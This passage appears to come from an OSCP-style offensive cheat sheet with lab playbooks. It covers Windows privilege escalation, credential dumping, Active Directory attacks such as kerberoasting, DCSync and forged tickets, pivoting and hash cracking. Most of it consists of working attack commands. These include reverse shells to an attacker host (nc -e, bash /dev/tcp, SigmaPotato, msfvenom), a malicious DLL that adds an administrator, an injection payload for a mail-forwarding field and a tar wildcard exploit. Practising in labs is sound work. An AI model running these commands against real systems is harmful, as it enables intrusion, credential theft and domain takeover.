type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s
Get-ChildItem C:\Users\USER -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object { $_.Extension -in '.txt','.xml','.config','.ini','.ps1' } |
  Select-Object -First 40 FullName
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

## SeImpersonate and SeAssignPrimaryToken

- Check the privilege before uploading anything.

```powershell
whoami /priv
```

- PrintSpoofer needs the spooler; it is the quietest option.

```powershell
Get-Service Spooler | Select-Object Status, StartType
C:\Windows\Temp\PrintSpoofer64.exe -i -c "cmd /c whoami"
C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe LHOST 443 -e cmd.exe"
```

- GodPotato and JuicyPotatoNG for builds where the spooler is gone.

```powershell
C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
C:\Windows\Temp\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
.\SigmaPotato.exe --revshell LHOST 4444
```

- Confirm SYSTEM properly; `whoami` alone can be fooled by a token change.

```powershell
whoami
whoami /priv
whoami /groups | findstr /i "System Mandatory"
echo %USERNAME%
```

## Service binary hijacking

- Find a service whose binary you can write to.

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\Program Files\Vendor\Service.exe"
```

- Replace it with a payload that adds an administrator, then restart.

```cmd
sc.exe stop GPGOrchestrator
sc.exe config GPGOrchestrator binPath= "cmd.exe /c net user hacker P@ssw0rd123! /add & net localgroup administrators hacker /add"
sc.exe start GPGOrchestrator
```

- `sc config` needs the space after `binPath=`; without it the service will not start.

## Unquoted service paths

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
icacls "C:\"
```

```text
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
```

## DLL hijacking

- Find a missing DLL the service loads from a writable directory, then compile one.

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            system("net user dave3 password123! /add");
            system("net localgroup administrators dave3 /add");
            break;
        default:
            break;
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

## Credential extraction

- Mimikatz in a single non-interactive invocation, logged to a file you can pull.

```cmd
mimikatz.exe "log C:\Windows\Temp\mimi.log" ^
  "privilege::debug" ^
  "token::elevate" ^
  "sekurlsa::logonpasswords" ^
  "sekurlsa::ekeys" ^
  "sekurlsa::tickets /export" ^
  "lsadump::sam" ^
  "lsadump::secrets" ^
  "lsadump::cache" ^
  "exit"
```

- `token::elevate` gives SYSTEM from an Administrator token and is a no-op if you are already SYSTEM.

```text
privilege::debug
token::elevate
sekurlsa::logonpasswords
```

- Registry hives when LSASS is protected.

```cmd
reg.exe save hklm\sam sam
reg.exe save hklm\system system
reg.exe save hklm\security security
```

- Parse them offline; never crack on the target.

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump 'Administrator:December31@TARGET' -outputfile ms01_20261124
```

- Chrome, PuTTY, FileZilla and RDP secrets.

```cmd
.\lazagne.exe all
.\SharpChrome.exe logins /unprotect
```

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

## Enabling remote access after escalation

- WinRM over HTTP, quickly.

```cmd
winrm quickconfig -q -force
winrm set winrm/config/service @{AllowUnencrypted="true"}
winrm set winrm/config/service/auth @{Basic="true"}
net start winrm
```

- RDP, firewall and group membership in one go.

```cmd
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net localgroup "Remote Desktop Users" USER /add
```

# Active Directory

## The shape of an AD set

```text
web/foothold ─► domain user ─► enumeration ─► kerberoast / reuse / MSSQL
                                                      │
                                      local admin on a member ─► dump LSA
                                                      │
                                     reuse the hash / DA owned ─► DC ─► all flags
```

Two facts decide most AD boxes: a domain user can read almost all of the directory, and local administrator passwords are reused across members.

## Clock and DNS before anything Kerberos

- Kerberos rejects more than five minutes of skew, and needs a name, not an IP.

```bash
nmap -p445 --script smb2-time DC01
sudo rdate -n DC01 && date -u
sudo ntpdate -u DC01
sudo timedatectl set-ntp true
```

```bash
echo '10.10.133.152 DC01.oscp.exam oscp.exam' | sudo tee -a /etc/hosts
```

## Enumeration without credentials

```bash
nxc smb TARGET
nxc winrm TARGET
nxc ldap DC01
enum4linux -a DC01
nbtscan -r 10.10.133.0/24
```

## Enumeration as a domain user

- Legacy tools first, because they need nothing uploaded.

```cmd
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Sales Department" /domain
nltest /dsgetdc:oscp.exam
nltest /domain_trusts /v
```

- LDAP path, then PowerView.

```powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"
```

```powershell
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetComputer | select operatingsystem,dnshostname
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Find-LocalAdminAccess
Find-DomainShare
```

- ACLs, because a single ACE is often the intended path.

```powershell
Get-ObjectAcl -Identity stephanie
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

## BloodHound

- Collect with the account you have; the data is readable by any domain user.

```bash
bloodhound-python -u web_svc -p Diamond1 -d oscp.exam -ns DC01 -dc dc01.oscp.exam -c All --zip
bloodhound-python -d oscp.exam -u celia.almeda -p '7k8XHk3dMtmpnC7' -ns 10.10.152.140 -dc DC01.oscp.exam -c All
```

```powershell
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\user\Desktop\
.\SharpHound.exe -c All --zipfilename loot.zip
```

- Read the JSON without Neo4j when the GUI is not available.

```bash
python3 enum_bh.py ./bh -o bh-report.md --owned ERIC.WALLOWS,WEB_SVC
```

- Empty is not the same as not collected: check `"Collected": false` before ruling a path out.

## Password attacks

- Policy first: it tells you how many attempts you have before lockout.

```bash
net accounts
nxc smb DC01 -u user -p pass --pass-pol
```

- Spray one password across many users, never the reverse.

```bash
nxc smb DC01 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

- Targeted lists beat rockyou on a lab: the image's passwords are Word+Number.

```bash
python3 gen_targeted.py --with-org oscp.exam,offsec,provinggrounds > targeted.txt
hashcat -m 2100 -a 0 both.txt targeted.txt --potfile-path ./pot --force
```

## Kerberoasting

- Any domain user can request a service ticket and crack it offline.

```bash
impacket-GetUserSPNs oscp.exam/eric.wallows:EricLikesRunning800 -dc-ip DC01 -request -outputfile eric_kerb.txt
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```bash
hashcat -m 13100 eric_kerb.txt /usr/share/wordlists/rockyou.txt --potfile-path ./pot --force
hashcat -m 13100 eric_kerb.txt --potfile-path ./pot --show
```

```bash
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

## AS-REP roasting

- Accounts with pre-authentication disabled hand over a crackable blob without a password.

```bash
impacket-GetNPUsers -dc-ip DC01 -request -outputfile hashes.asreproast corp.com/pete
nxc ldap DC01 -u harry -p pass --asreproast output.txt
```

```cmd
.\Rubeus.exe asreproast /nowrap
```

```bash
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## MSSQL as a foothold

- `sysadmin` means `xp_cmdshell`; anything less means impersonation or a linked server.

```sql
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;          RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

- Alternative execution paths when `xp_cmdshell` is blocked.

```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT;
EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c whoami > C:\Windows\Temp\o.txt';

EXECUTE AS LOGIN = 'sa';
```

- Borrow the machine account's hash with an outbound UNC path.

```sql
EXEC master..xp_dirtree '\\LHOST\loot', 1, 1;
```

```bash
sudo responder -I tun0 -v
hashcat -m 5600 sqlsvc_netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

- `windows.old` keeps a copy of the registry that is readable without shadow copies.

```sql
EXEC xp_cmdshell 'dir C:\windows.old\Windows\System32\config\';
EXEC xp_cmdshell 'copy /y C:\windows.old\Windows\System32\config\SAM    C:\Windows\Temp\SAM_old';
EXEC xp_cmdshell 'copy /y C:\windows.old\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM_old';
```

```sql
EXEC xp_cmdshell 'vssadmin list shadows';
EXEC xp_cmdshell 'copy /y \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Windows\Temp\SAM_old';
EXEC xp_cmdshell 'robocopy C:\windows.old\Windows\System32\config C:\Windows\Temp\config_old /b SAM SYSTEM';
```

```bash
impacket-secretsdump -sam SAM_old -system SYSTEM_old LOCAL
```

## Lateral movement

- Pass-the-hash with `nxc` and `evil-winrm`; no plaintext needed.

```bash
nxc smb DC01 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc -d oscp.exam
nxc winrm DC01 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc -d oscp.exam
evil-winrm -i DC01 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc
```

- The same hash for the local Administrator, which ignores the domain.

```bash
nxc smb TARGET -u Administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b --local-auth
```

- WMI and WinRM from a Windows host.

```cmd
wmic /node:TARGET /user:jen /password:Nexus123! process call create "calc"
winrs -r:TARGET -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```

- PsExec needs local admin, `ADMIN$`, and file sharing.

```cmd
.\PsExec64.exe -i \\TARGET -u corp\jen -p Nexus123! cmd
```

- Overpass-the-hash: use the hash to get a Kerberos ticket, then use Kerberos.

```text
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

```cmd
.\PsExec.exe \\TARGET cmd
```

## Pass the ticket

- Export what is in memory, then inject the one you need.

```text
privilege::debug
sekurlsa::tickets /export
kerberos::ptt "C:\Users\Administrator\Desktop\[0;5b0ba]-2-0-40e10000-john@krbtgt-CORP.HTB.kirbi"
```

```cmd
Rubeus.exe dump /nowrap
Rubeus.exe ptt /ticket:<BASE64_TICKET>
Rubeus.exe ptt /ticket:C:\path\john.kirbi
```

```powershell
Enter-PSSession -ComputerName DC01
```

- On Linux, a ccache or keytab does the same job.

```bash
find / -name '*keytab*' -ls 2>/dev/null
klist -k -t user.keytab
kinit USER@REALM -k -t user.keytab
klist
```

```bash
cp /tmp/krb5cc_1000 .
export KRB5CCNAME=$PWD/krb5cc_1000
smbclient //TARGET/share -k -c ls
impacket-wmiexec TARGET -k
evil-winrm -i TARGET -r REALM
```

## Kerberos tickets you forge

- Silver ticket: you need the service account's hash and the domain SID.

```text
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<hash> /user:jeffadmin
```

- Golden ticket: `krbtgt`, plus the parent SID for a child domain.

```bash
impacket-ticketer -nthash 80f23a248d39b8cb93df3a4a2f4199a1 -domain sub.poseidon.yzx \
  -domain-sid S-1-5-21-4168247447-1722543658-2110108262 \
  -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py sub.poseidon.yzx/Administrator@DC01.poseidon.yzx -k -no-pass
```

- `raiseChild.py` automates the child-to-parent escalation.

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

## DCSync

- With DA rights, ask the DC to replicate and hand over the hashes.

```text
lsadump::dcsync /user:corp\dave
```

```bash
impacket-secretsdump -just-dc-user krbtgt 'oscp.exam/tom_admin@DC01'
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

## ADCS

- Certificate templates are a second, parallel path to DA.

```bash
certipy-ad find -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip DC01 -target-ip DC01 -vulnerable
cat 20260216030602_Certipy.txt
```

# Pivoting and tunneling

## ligolo-ng

- The proxy and its tun interface on Kali.

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

- The agent on the pivot host, started detached.

```bash
nxc winrm TARGET -u Administrator -p December31 --local-auth \
  -x 'cmd /c start /b C:\Windows\Temp\agent.exe -connect LHOST:443 -ignore-cert'
```

- Session, route, and a listener for reverse shells from the internal segment.

```console
ligolo-ng » session
ligolo-ng » start
```

```bash
sudo ip route add 10.10.133.0/24 dev ligolo
```

```console
ligolo-ng » listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
ligolo-ng » listener_add --addr LHOST:30000 --to 127.0.0.1:10000 --tcp
```

- Verify with a protocol handshake, not a TCP connect.

```bash
nxc smb 10.10.133.152
nmap -sn 10.10.133.0/24 -oG internal.txt
nmap -Pn -p 88,135,139,389,445,5985,3389 --open 10.10.133.0/24 -oN internal-ports.txt
```

- Tear it down when you are done.

```bash
sudo ip route del 10.10.133.0/24 dev ligolo
sudo ip link set ligolo down && sudo ip tuntap del dev ligolo mode tun
```

## SSH

- Local forward: one port.

```bash
ssh -f -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

- Dynamic forward plus proxychains.

```bash
ssh -f -N -D 9050 database_admin@10.4.50.215
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

- Remote forward: bring a target port back to your host.

```bash
ssh -f -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@LHOST
ssh -f -N -R 9998 kali@LHOST
```

- `sshuttle` routes a whole subnet without per-port rules.

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

## chisel

```bash
chisel server -p 8000 --reverse
chisel client LHOST:8000 R:8080:localhost:80
chisel client LHOST:8000 R:9990:socks
```

```console
# /etc/proxychains4.conf
socks5 127.0.0.1 9990
```

## socat

```bash
socat TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

## proxychains

```bash
tail /etc/proxychains4.conf
sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
proxychains ssh database_admin@10.4.50.215
```

## Windows-native forwarding

```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 LHOST
```

# Credentials and cracking

## Identify the hash before choosing a mode

| Value | hashcat | Notes |
| --- | --- | --- |
| NTLM | `-m 1000` | SAM, secretsdump, mimikatz output |
| Net-NTLMv2 | `-m 5600` | Responder capture, cannot be replayed |
| Kerberoast TGS | `-m 13100` | `$krb5tgs$23$*user$REALM$...` |
| AS-REP | `-m 18200` | `$krb5asrep$23$user@REALM` |
| DCC2 / cached | `-m 2100` | `$DCC2$10240#user#hash` |
| MS Cache 2 (john) | `-m 2100` | same as above |
| `/etc/shadow` | `-m 1800` | after `unshadow` |
| KeePass `.kdbx` | `-m 13400` | `keepass2john` |
| SSH private key | `-m 22921` | `ssh2john` |

## Cracking workflow

- Always crack with a potfile so a second run is instant.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --potfile-path ./pot --force
hashcat -m 1000 hashes.txt --potfile-path ./pot --show
```

- Validate the tooling on a known pair before trusting an empty result.

```bash
printf '%s\n' '$DCC2$10240#eric.wallows#28c1cc0c4fa49db338857157d3aded70' > eric.txt
printf '%s\n' 'EricLikesRunning800' > cand.txt
hashcat -m 2100 eric.txt cand.txt --potfile-path ./pot --force --quiet
hashcat -m 2100 eric.txt --potfile-path ./pot --show
```

- Rules turn one wordlist into thousands of candidates.

```bash
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

- John for formats hashcat handles badly.

```bash
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
```

```bash
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
john --format=sha512crypt /tmp/unshadowed.hashes
```

## Network service brute force

- Hydra, one user and a list.

```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://TARGET
hydra -L users.txt -p "SuperS3cure1337#" rdp://TARGET
hydra -l user -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

- nxc's built-in spraying is faster and safer for AD.

```bash
nxc smb TARGET -u users.txt -p passwords.txt -d domain --continue-on-success
nxc smb TARGET -u user -p pass --shares
```

## Credential capture

- Responder for anything that authenticates outbound.

```bash
sudo responder -I tun0 -v
sudo responder -I ligolo -v
```

- Relay when you need access, not a password.

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc <base64>"
```

- Capture plaintext at logon when hashes are not enough.

```text
mimikatz # privilege::debug
mimikatz # misc::memssp
type C:\Windows\System32\mimilsa.log
```

## Windows secret stores

```cmd
cmdkey /list
runas /savecred /user:SRV01\mcharles cmd
```

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

```bash
keepass2john Database.kdbx > keepass.hash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

# Loot, evidence, cleanup

## Flags

- Where they live, and how to prove you read them.

```bash
cat /root/proof.txt
cat /home/user/local.txt
```

```powershell
type C:\Users\Administrator\Desktop\proof.txt
```

- Record `whoami; hostname; ifconfig` in the same capture as the flag.

```bash
whoami && hostname && ifconfig | head -5
```

## Evidence that survives the report

- Keep raw requests for every web finding: method, path, headers, body, response.

```bash
curl -s -D - "http://TARGET/api/v1/edit/mail/index.php?domain=pwn&account=x" -d "v_fwd=test" -o evidence/replay.txt
```

- Screenshot the flag, the hostname and the clock in one frame.
- Timestamp every file you save; the exam report needs a timeline.

```bash
date -u | tee -a evidence/timeline.txt
```

## Cleanup checklist

- Linux: remove what you planted, in reverse order.

```bash
rm -f /opt/admin/--checkpoint=1 '/opt/admin/--checkpoint-action=exec=sh pwn.sh' /opt/admin/pwn.sh
rm -f /home/cassie/rootbash /home/cassie/proof.txt /home/cassie/exec_test.txt
rm -f /tmp/screenroot/rbash /tmp/screenroot/.lock
ls -la /etc/ld.so.preload
```

- Restore a config you changed.

```bash
/home/cassie/rootbash -p -c 'cp /home/cassie/sshd_config.bak /etc/ssh/sshd_config && systemctl restart ssh'
```

- Windows: uploaded tools, registry keys, xp_cmdshell.

```powershell
del C:\Windows\Temp\mimikatz.exe
del C:\Windows\Temp\PrintSpoofer64.exe
del C:\Windows\Temp\agent.exe
del C:\Windows\Temp\mimi.log
del C:\Windows\Temp\sam.hiv; del C:\Windows\Temp\system.hiv; del C:\Windows\Temp\security.hiv
```

```sql
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

- Kali: routes, interfaces, clock.

```bash
sudo ip route del 10.10.133.0/24 dev ligolo
sudo ip link set ligolo down && sudo ip tuntap del dev ligolo mode tun
sudo timedatectl set-ntp true
```

- Panel-based work needs its API cleanup, not just `rm`.

```bash
TOK=$(curl -sk https://TARGET:8083/api/v1/login/session.php | grep -oE '"token":"[a-f0-9]+"' | cut -d'"' -f4)
curl -sk -b cookies.txt "https://TARGET:8083/api/v1/delete/mail/index.php?domain=pwn.poc&token=$TOK"
curl -sk -b cookies.txt "https://TARGET:8083/api/v1/delete/web/index.php?domain=pwn.poc&token=$TOK"
```

# Lab playbooks

Every box solved in this repository, reduced to the chain that actually worked. Read them as patterns, not recipes: the lesson in each one is the step that was *not* the obvious one.

## SNMP to Mobile Mouse to PrintNightmare

```text
161/udp public ─► hrSWRunTable shows "Mobile Mouse" ─► 1978 open
      │                                                    │
      └──────────────► msf wifi_mouse_rce ◄───────────────┘
                            │
                    shell as offsec ─► CVE-2021-1675 (Invoke-Nightmare)
                            │
                    adm1n local admin ─► RDP ─► proof.txt
```

- The process table is what names the product; the port scan alone said nothing.

```bash
snmpwalk -v1 -c public TARGET 1.3.6.1.2.1.25.4.2.1.2 | sed -E 's/.*STRING: //' | sort -u
sudo nmap -sU -p 161 --reason TARGET
```

- Then the RCE, with Metasploit or the standalone EDB script.

```bash
msfconsole -q -x 'use exploit/windows/misc/wifi_mouse_rce; set RHOSTS TARGET; set LHOST LHOST; run'
```

```bash
searchsploit -m 50972
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=443 -f exe -o s.exe
python3 50972.py TARGET LHOST s.exe
```

- PrintNightmare for the jump to local admin, then RDP.

```powershell
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare
net user adm1n
net localgroup administrators
```

```bash
xfreerdp /u:adm1n /v:TARGET /p:'P@ssw0rd' /cert:ignore +clipboard
```

## Mobile Mouse to service binary hijack

```text
80/5986/7680/9099/9999/35913 ─► Mobile Mouse ─► shell as Tim
        │
        └─► Seatbelt + PowerUp ─► GPGOrchestrator service, weak ACL on its binary
                     │
             sc config binPath= net user hacker … ─► admin ─► WinRM 5986
```

- Enumeration that named the finding.

```powershell
iwr http://LHOST/Seatbelt.exe -OutFile .\Seatbelt.exe
.\Seatbelt.exe -group=all -full
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

- The service binary was writable; the restart runs your command as SYSTEM.

```cmd
icacls "C:\Program Files\MilleGPG5\GPGService.exe"
sc.exe stop GPGOrchestrator
sc.exe config GPGOrchestrator binPath= "cmd.exe /c net user hacker P@ssw0rd123! /add & net localgroup administrators hacker /add"
sc.exe start GPGOrchestrator
net localgroup administrators
```

- WinRM on 5986 needed the TLS flag.

```bash
evil-winrm -i TARGET -u hacker -p 'P@ssw0rd123!' -S -P 5986
```

## FreeSWITCH ESL default password

```text
8021 open ─► auth ClueCon ─► api system <cmd> ─► shell as chris
                                                   │
                                        SeImpersonate ─► GodPotato ─► SYSTEM
```

- The default password is the whole foothold.

```bash
{ printf 'auth ClueCon\n\n'; sleep 2; printf 'api system whoami\n\n'; sleep 2; } | timeout 10 nc TARGET 8021
python3 1.py TARGET "powershell -nop -c \"(New-Object Net.Sockets.TcpClient).Connect('LHOST',4451);'ok'\""
```

- GodPotato, because the spooler was not available.

```powershell
C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

## Aerospike UDF to screen 4.5.0

```text
3000-3003 Aerospike ─► CVE-2020-13151 udf_put + apply ─► shell as aero
        │
        └─► /usr/bin/screen is setuid and old ─► CVE-2017-5618
                     │
             write /etc/ld.so.preload via screen -L ─► root
```

- The UDF is five lines of Lua; the client is the exploit.

```bash
python3 poc_aerospike_rce.py --ahost TARGET --cmd 'id; hostname; uname -r'
```

- Egress was filtered by port, which decided the shell port.

```bash
nc -lvnp 3000
python3 poc_aerospike_rce.py --ahost TARGET \
  --cmd 'setsid bash -c "bash -i >& /dev/tcp/LHOST/3000 0>&1" >/dev/null 2>&1 </dev/null &'
```

- The screen exploit writes a root-owned file with `-L`, then the preload library runs as root.

```bash
cd /etc && umask 000 && \
screen -D -m -L ld.so.preload /bin/sh -c 'printf "\n/tmp/screenroot/libhax.so\n"' >/dev/null 2>&1
screen -ls >/dev/null 2>&1
cat /tmp/screenroot/rootout.txt
```

## Git exposure to PwnKit

```text
80 ─► /.git reachable ─► git-dumper ─► old commits ─► DB password + user
      │
      └─► SSH/FTP reuse ─► shell as stuart
                │
        Ubuntu 22.04 ─► PwnKit ─► root ─► proof.txt
```

- Dump, then read the history rather than the working tree.

```bash
git-dumper http://TARGET/.git ./loot
cd loot && git log --all --oneline
git show 80ad5fe:configuration/database.php
git show 44a055d
```

- The credential was reused on SSH and FTP.

```bash
sshpass -p 'BreakingBad92' ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no stuart@TARGET 'id; hostname'
curl -s -u 'stuart:BreakingBad92' ftp://TARGET/local.txt
```

- PwnKit for root, then the flag and the hash.

```bash
cd /tmp/pk161 && ./cve-2021-4034; echo "exit=$?"
cat /root/proof.txt
```

## SNMP extend to Vesta panel to root

```text
161/udp public ─► nsExtendConfigTable prints a chpasswd command ─► jack's password
        │
        └─► panel 8083 (token → login) ─► API v-add/v-edit run as root
                     │
             mailbox forwarding field = second-order injection ─► root
```

- The extend table is a script the daemon runs; it often contains a literal password.

```bash
snmpwalk -v1 -c public TARGET 1.3.6.1.4.1.8072.1.3.2
```

- Verify the credential everywhere before building on it.

```bash
ssh jack@TARGET
curl -s --url 'imap://TARGET/' -u 'jack:3PUKsX98BMupBiCf' -v 2>&1 | grep -iE 'OK|NO|Login'
```

- The injection lives in `v_fwd`, and root evaluates it when the mailbox is edited.

```text
';bash</home/jack/web/pwn.poc/public_html/iamroot/cmdtoexec>/home/jack/web/pwn.poc/public_html/iamroot/cmdresult;A='
```

## Anonymous FTP to Usermin to tar wildcard

```text
21 anon FTP ─► 5 PDFs ─► exiftool Creator: Cassie/Mark/Robert
      │
      └─► cassie:cassie ─► local.txt over FTP
                │
      20000 Usermin 1.820 ─► GnuPG key name RCE ─► authorized_keys
                │
      DenyUsers cassie ─► root via tar --checkpoint-action ─► unblock ─► SSH
```

- Metadata becomes a username list; the password was the username.

```bash
exiftool -Author -Creator -CreatorTool -Producer *.pdf
python3 scripts/charlie_ftp_credtest_7f3a.py -H TARGET
```

- Usermin RCE, proved with a file write first.

```bash
python3 scripts/exploit_usermin_1820_7f3a.py -u TARGET -l cassie -p cassie \
  --lhost LHOST --lport 1337 --payload 'id > /home/cassie/exec_test.txt 2>&1;'
```

- Root cron plus a writable directory plus `tar *` is the last step.

```bash
cd /opt/admin
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'
```

## Text4Shell to JDWP

```text
80 ─► Apache Commons Text ─► ${script:javascript:...} ─► RCE as tomcat
      │
      └─► 8000 JDWP on the java process (root) ─► JDI exec ─► root
```

- Confirm the substitution before weaponising it.

```bash
curl -s "http://TARGET/search?q=\${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
```

- Then the debug port, which is a root shell with extra steps.

```bash
java -cp . JdiBreakExec TARGET:8000 'id'
java -cp . JdiVmSuspend TARGET:8000
```

## SNMP to SUID PATH hijack

```text
161/udp public ─► extend table ─► credentials ─► FTP ─► SSH key
      │
      └─► john ─► /home/john/RESET_PASSWD (setuid root, calls system("chpasswd"))
                   │
            PATH=/tmp:$PATH ─► fake chpasswd ─► root
```

- Read the binary before exploiting it; `strings` names the exact command it runs.

```bash
strings -a /home/john/RESET_PASSWD | head -40
objdump -d -M intel RESET_PASSWD.bin | sed -n '/<main>:/,/^$/p'
```

- Plant a `chpasswd` earlier in `PATH`, then run the setuid binary.

```bash
D=$(mktemp -d /tmp/pp.XXXXXX)
printf '#!/bin/bash\nid > /tmp/root_id.txt\ncat /root/proof.txt > /tmp/root_proof.txt\nchmod 644 /tmp/root_proof.txt\n' > "$D/chpasswd"
chmod +x "$D/chpasswd"
PATH="$D:$PATH" /home/john/RESET_PASSWD
```

## The AD set, end to end

```text
web_svc creds ─► MS02 shell ─► DCC2 cache ─► web_svc cracked
      │
      └─► member local admin reuse ─► MS01 SYSTEM ─► LSA secrets
                │
        DA hash (tom_admin) ─► DC01 ─► DCSync ─► all flags
```

- Kerberoast and cache cracking, with the clock fixed first.

```bash
sudo rdate -n DC01
impacket-GetUserSPNs oscp.exam/eric.wallows:EricLikesRunning800 -dc-ip DC01 -request -outputfile eric_kerb.txt
hashcat -m 13100 eric_kerb.txt /usr/share/wordlists/rockyou.txt --potfile-path ./pot --force
```

- Cached domain credentials fall to a targeted list faster than to rockyou.

```bash
python3 gen_targeted.py --with-org oscp.exam,offsec,provinggrounds > targeted.txt
hashcat -m 2100 -a 0 both.txt targeted.txt --potfile-path ./pot --force
```

- Local admin reuse across members is the most common intended path.

```bash
nxc smb MS01 -u Administrator -p December31 --local-auth
nxc smb MS01 -u Administrator -H 3c4495bbd678fac8c9d218be4f2bbc7b --local-auth
```

- Then DA, and DCSync for the rest.

```bash
